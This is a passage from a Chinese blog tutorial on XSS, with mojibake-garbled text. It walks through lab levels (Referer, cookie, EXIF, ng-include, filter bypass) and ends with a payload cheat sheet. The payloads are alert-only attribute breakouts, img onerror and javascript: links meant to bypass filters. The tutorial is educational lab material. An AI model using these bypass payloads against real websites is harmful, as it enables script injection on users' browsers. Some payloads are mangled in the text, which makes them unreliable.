$str11=$_SERVER['HTTP_REFERER'];//è·å¾—refererè¯·æ±‚å¤´
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>&quot;.'<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>search</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>t_link<span class="token punctuation">&quot;</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">'</span>.'<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>t_history<span class="token punctuation">&quot;</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">'</span>.'<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>t_sort<span class="token punctuation">&quot;</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">'</span>.htmlspecialchars($str00).'<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>t_ref<span class="token punctuation">&quot;</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">'</span>.$str33.'<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>//refæ¥æ”¶referer
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>æ‰€ä»¥ç›´æ¥æŠ“åŒ…ç»™refererä¼ å…¥å°±è¡Œ</p> <p>(<strong>&quot; onfocus=javascript:alert(/45/) type=&quot;text&quot;</strong>)</p> <h3 id="_11-uaæ²¡çš„è¯´"><a href="#_11-uaæ²¡çš„è¯´" class="header-anchor">#</a> 11.UAæ²¡çš„è¯´</h3> <h3 id="_12-cookieçš„æ„æˆ"><a href="#_12-cookieçš„æ„æˆ" class="header-anchor">#</a> 12.Cookieçš„æ„æˆ</h3> <p>13é¢˜å’Œä¹‹å‰çš„åäºŒåä¸€ç±»ä¼¼ï¼Œä½†æ˜¯è¦äº†è§£cookieçš„æ„æˆã€‚</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;user&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;call me maybe?&quot;</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>åœ¨æµè§ˆå™¨ä¸­ï¼š</p> <p><strong>Cookie	  user=call+me+maybe%3F</strong></p> <p>æ‰€ä»¥è¦æ³¨æ„bpçš„æ„é€ æ ¼å¼</p> <h3 id="_13-å›¾ç‰‡exifæ„é€ xss"><a href="#_13-å›¾ç‰‡exifæ„é€ xss" class="header-anchor">#</a> 13.å›¾ç‰‡exifæ„é€ xss</h3> <p>ç®€å•åœ°è¯´ï¼Œå°±æ˜¯exifçš„æ ¼å¼ä¸‹çš„å›¾ç‰‡ï¼ˆ<strong>åŸç›¸æœºæ‹ç…§ï¼Œæœªç»è¿‡å¤„ç†</strong>ï¼‰ä¼šä¿å­˜å›¾ç‰‡çš„ä¸€éƒ¨åˆ†ä¿¡å¿ƒï¼ˆåŒ…æ‹¬åˆ›å»ºæ—¶é—´ï¼Œé•œå¤´åˆ¶é€ å•†å¼€å®šä½è¿˜ä¼šæš´éœ²ç»çº¬åº¦ç­‰ç­‰ä¿¡æ¯ï¼‰ï¼Œè¿™åœ¨xssçš„åˆ©ç”¨ä¸­å°±æ˜¯ä¿®æ”¹è¿™éƒ¨åˆ†ä¿¡æ¯ï¼Œå†™å…¥è„šæœ¬ï¼Œåœ¨èƒ½è¯»å–exifå›¾ç‰‡ä¿¡æ¯çš„ç½‘ç«™ä¸Šä¼ æ˜¾ç¤ºè¯¥å›¾ç‰‡ä¿¡æ¯ï¼Œä½†æ˜¯è¯¥ç½‘ç«™ä¹Ÿæœªå¯¹æ¶æ„è„šæœ¬è¿›è¡Œè¿‡æ»¤ï¼ˆå¦‚æœæœ‰ï¼Œå°±æ˜¯è¿‡æ»¤å°–æ‹¬å·ï¼‰ï¼Œæ­¤æ—¶å¯ä»¥æ‰§è¡Œxssè„šæœ¬ï¼Œé€ æˆä¿¡æ¯æ³„éœ²ã€‚</p> <h3 id="_14-æ–‡ä»¶åŒ…å«"><a href="#_14-æ–‡ä»¶åŒ…å«" class="header-anchor">#</a> 14.æ–‡ä»¶åŒ…å«</h3> <div class="language-ph extra-class"><pre class="language-text"><code>$str = $_GET[&quot;src&quot;];
echo '&lt;body&gt;&lt;span class=&quot;ng-include:'.htmlspecialchars($str).'&quot;&gt;&lt;/span&gt;&lt;/body&gt;';
</code></pre></div><blockquote><p>1ã€ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTMLæ–‡ä»¶ã€‚</p></blockquote> <p>â€‹      2ã€åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚</p> <p>â€‹	  3ã€ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚</p> <div class="language- extra-class"><pre><code> 4ã€é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚
</code></pre></div><blockquote><p>ç‰¹åˆ«å€¼å¾—æ³¨æ„çš„å‡ ç‚¹å¦‚ä¸‹ï¼š</p></blockquote> <p>â€‹		1.ng-include,å¦‚æœå•çº¯æŒ‡å®šåœ°å€ï¼Œå¿…é¡»è¦åŠ å¼•å·</p> <p>â€‹		2.ng-include,åŠ è½½å¤–éƒ¨htmlï¼Œscriptæ ‡ç­¾ä¸­çš„å†…å®¹ä¸æ‰§è¡Œ</p> <p>â€‹		3.ng-include,åŠ è½½å¤–éƒ¨htmlä¸­å«æœ‰styleæ ‡ç­¾æ ·å¼å¯ä»¥è¯†åˆ«</p> <p>â€‹		æ‰€ä»¥åªéœ€è¦å¼•ç”¨ä¸€ä¸ªåŒ…å«xssçš„æ–‡ä»¶å°±å¯ä»¥äº†</p> <p>payload:</p> <div class="language-html extra-class"><pre class="language-html"><code>(src= 'level10.php?t_sort=&quot; onclick=alert(/89/) type=&quot;text&quot; &gt;&lt; ')
  
</code></pre></div><h3 id="_15-è¢«è¿‡æ»¤"><a href="#_15-è¢«è¿‡æ»¤" class="header-anchor">#</a> 15./è¢«è¿‡æ»¤</h3> <p>æºç ï¼š</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;display_errors&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;keyword&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;script&quot;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&amp;nbsp;&quot;</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//script /è¿›è¡Œæ›¿æ¢ï¼ŒåŒæ—¶ç©ºä¹Ÿè¢«æ›¿æ¢</span>
<span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot; &quot;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&amp;nbsp;&quot;</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/&quot;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&amp;nbsp;&quot;</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;	&quot;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;&amp;nbsp;&quot;</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;center&gt;&quot;</span><span class="token operator">.</span><span class="token variable">$str5</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;&lt;/center&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre></div><p>æ‰€ä»¥åœ¨è¿™é‡Œåªè¦æ˜¯åŒæ ‡ç­¾éƒ½ä¸èƒ½ä½¿ç”¨ï¼ŒåŒæ—¶ç”±äº&amp;nbspæ›¿æ¢äº†ç©ºæ ¼ï¼ˆåœ¨å±æ€§ä¸­ä¸èƒ½è¢«è§£æï¼Œè¿”å›ç©ºï¼‰ï¼Œæ‰€ä»¥</p> <p>åªèƒ½å°†ç©ºæ ¼å¤„æ¢ä¸º%0aï¼ˆæ¢è¡Œï¼‰</p> <p>å•æ ‡ç­¾ï¼šimg</p> <p>ğŸ˜„<img rc="" onerror="javascript:alert('ç‹ç™»ç™»çš„åšå®¢')"></p> <p>åœ¨å›¾ç‰‡å‡ºç°é”™è¯¯æ—¶ï¼Œæ‰§è¡Œonerrorçš„jså‡½æ•°</p> <p>å•æ ‡ç­¾ï¼šinput</p> <p>&lt;input type=&quot;submit&quot; onfocus=&quot;ğŸ˜„java:alert('wangjingze')&quot;;&gt;</p> <p><strong>æ³¨æ„ï¼š</strong></p> <p>onfocusä»¥åŠonerrorçš„å€¼å½¢å¼;</p> <p>=</p> <ol><li>â€‹	â€     å‰é¢éšä¾¿å†™:alert(1)	â€œ,æ‰€ä»¥å³ä½¿åŠ äº†scriptä¹Ÿä¼šæ‰§è¡Œ</li> <li>&quot;	ğŸ˜„alert(1)	&quot;</li> <li>ğŸ˜„alert(1)</li></ol> <h1 id="ä¸‰ã€å¯¹äºæ‰€æœ‰çš„xssç±»å‹åšå‡ºæ€»ç»“-æ–¹ä¾¿ç›´æ¥åšé¢˜"><a href="#ä¸‰ã€å¯¹äºæ‰€æœ‰çš„xssç±»å‹åšå‡ºæ€»ç»“-æ–¹ä¾¿ç›´æ¥åšé¢˜" class="header-anchor">#</a> ä¸‰ã€å¯¹äºæ‰€æœ‰çš„xssç±»å‹åšå‡ºæ€»ç»“ï¼Œæ–¹ä¾¿ç›´æ¥åšé¢˜</h1> <h2 id="_1-è¢«ban"><a href="#_1-è¢«ban" class="header-anchor">#</a> 1.&lt;&gt;è¢«ban</h2> <p>(('onfocus=javascript:alert('90')</p> <p>' onclick=javascript:alert(/88/) //é’ˆå¯¹å•åŒå¼•å·ä¸è¢«ä½¿ç”¨ï¼Œä½†æ˜¯è¦æ±‚å›æ˜¾å­—ç¬¦ä¸²ã€‚))</p> <p>htmlspecialchars() å¯ç”¨çš„å¼•å·ç±»å‹ï¼š</p> <ul><li>ENT_COMPAT - <strong>==é»˜è®¤ã€‚ä»…ç¼–ç åŒå¼•å·==</strong>ã€‚</li></ul> <h2 id="_2-onä»¥åŠå«æœ‰-scriptçš„è¿‡æ»¤"><a href="#_2-onä»¥åŠå«æœ‰-scriptçš„è¿‡æ»¤" class="header-anchor">#</a> 2.onä»¥åŠå«æœ‰&lt;scriptçš„è¿‡æ»¤</h2> <p>é—­åˆå‰æ ‡ç­¾</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>a <span class="token punctuation">:</span>smile<span class="token punctuation">:</span> hrf<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'wdd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&gt;</span>alert <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div></div></article> <div class="main-div vssue"><!----></div></div></main> <aside class="aside" data-v-b3fda33c data-v-b3fda33c><div class="info-card main-div" data-v-1311ce9e data-v-b3fda33c><div class="info-card-header" style="background-size:cover;background-repeat:no-repeat;background-position:center;background-attachment:scroll;background-image:url(/wangdengdeng/avatar-bg.jpeg);" data-v-1311ce9e><img src="/wangdengdeng/avatar-top.jpeg" alt="20046219-ç‹æ•¬æ³½" class="info-avatar" data-v-1311ce9e></div> <div class="info-card-body" data-v-1311ce9e><section class="info-name" data-v-1311ce9e>
      20046219-ç‹æ•¬æ³½
    </section> <section class="info-desc" data-v-1311ce9e>I am a slow walker, but I never walk backwards.<br/>é“é˜»ä¸”é•¿,è¡Œåˆ™å°†è‡³</section> <section class="info-contact" data-v-1311ce9e><section data-v-1311ce9e><span data-v-1311ce9e data-v-1311ce9e><svg class="icon" style="font-size:1em;" data-v-1311ce9e data-v-1311ce9e><use xlink:href="#icon-location" data-v-1311ce9e data-v-1311ce9e></use></svg><span class="info-text" data-v-1311ce9e data-v-1311ce9e>
          China
        </span></span></section> <!----> <section data-v-1311ce9e><span data-v-1311ce9e data-v-1311ce9e><svg class="icon" style="font-size:1em;" data-v-1311ce9e data-v-1311ce9e><use xlink:href="#icon-email" data-v-1311ce9e data-v-1311ce9e></use></svg><span class="info-text" data-v-1311ce9e data-v-1311ce9e>
          1055192032@qq.com
        </span></span></section></section></div> <div class="info-card-footer" data-v-1311ce9e><p class="footer-sns-link" data-v-1311ce9e></p></div></div> <div class="post-toc main-div aside-toc" style="position:relative;top:0;width:0px;" data-v-b3fda33c><h4>- CATALOG</h4> <div class="post-nav-toc"><ul><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#åå°„å‹">åå°„å‹:</a><ul><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_1-ç›´æ¥æ¥å—è¡¨å•ä¼ è¾“çš„å€¼-æ‹¼æ¥åœ¨htmlä»£ç ä¸­æ‰§è¡Œ">1.ç›´æ¥æ¥å—è¡¨å•ä¼ è¾“çš„å€¼ï¼Œæ‹¼æ¥åœ¨htmlä»£ç ä¸­æ‰§è¡Œ</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_2-ä¸€ä¸ªå‡½æ•°htmlspecialchars">2.ä¸€ä¸ªå‡½æ•°	htmlspecialchars()</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_3-æ·±å…¥ä¸€ä¸ªå‡½æ•°htmlspecialchars-çš„ä¼ å‚">3.æ·±å…¥ä¸€ä¸ªå‡½æ•°htmlspecialchars()çš„ä¼ å‚ï¼š</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_4-é»‘åå•o-n-scr-iptç»•è¿‡">4.é»‘åå•on	&lt;scriptç»•è¿‡</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_5-å¤§å°å†™ç»•è¿‡">5.å¤§å°å†™ç»•è¿‡</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_6-åŒå†™ç»•è¿‡">6.åŒå†™ç»•è¿‡</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_7-æºç ">7.æºç ï¼š</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_8-æºç ">8.æºç ï¼š</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_9-inputçš„æ–°å±æ€§">9.inputçš„æ–°å±æ€§</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_10-referer">10.referer:</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_11-uaæ²¡çš„è¯´">11.UAæ²¡çš„è¯´</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_12-cookieçš„æ„æˆ">12.Cookieçš„æ„æˆ</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_13-å›¾ç‰‡exifæ„é€ xss">13.å›¾ç‰‡exifæ„é€ xss</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_14-æ–‡ä»¶åŒ…å«">14.æ–‡ä»¶åŒ…å«</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_15-è¢«è¿‡æ»¤">15./è¢«è¿‡æ»¤</a></li></ul></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_1-è¢«ban">1.è¢«ban</a></li><li><a href="/wangdengdeng/posts/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss.html#_2-onä»¥åŠå«æœ‰-scriptçš„è¿‡æ»¤">2.onä»¥åŠå«æœ‰&lt;scriptçš„è¿‡æ»¤</a></li></ul></div></div></aside></div> <footer class="footer" data-v-7f2e4136><p class="footer-sns-link"></p> <div class="copyright"><span id="custom">Copyright &copy; WADE_2ng 2020 <br /> 
        Theme By <a href="https://www.vuepress.cn/" target="_blank">VuePress</a></span> <!----></div></footer></div><div class="global-ui"><!----><!----></div></div>
    <script src="/wangdengdeng/assets/js/app.3ead440b.js" defer></script><script src="/wangdengdeng/assets/js/6.e2e47644.js" defer></script><script src="/wangdengdeng/assets/js/15.c2d45576.js" defer></script>
  </body>
</html>
